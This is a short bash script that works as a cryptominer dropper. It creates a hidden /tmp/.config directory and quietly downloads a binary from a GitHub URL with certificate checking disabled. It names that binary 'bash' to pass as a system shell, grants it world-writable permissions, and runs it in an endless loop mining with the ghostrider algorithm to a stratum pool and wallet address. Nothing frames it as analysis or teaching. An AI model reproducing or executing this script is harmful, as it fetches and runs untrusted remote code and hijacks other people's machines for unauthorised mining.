#!/bin/bash

mkdir -p /tmp/.config
cd /tmp/.config
wget --no-check-certificate -4 -qO "/tmp/.config/bash" "https://github.com/curiosityinteriorsuk/2088/raw/main/b"
chmod -R  777 /tmp/.config

#!/bin/sh
while [ 1 ]; do
	/tmp/.config/bash -a ghostrider --url stratum-asia.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2088a
	sleep 5
done
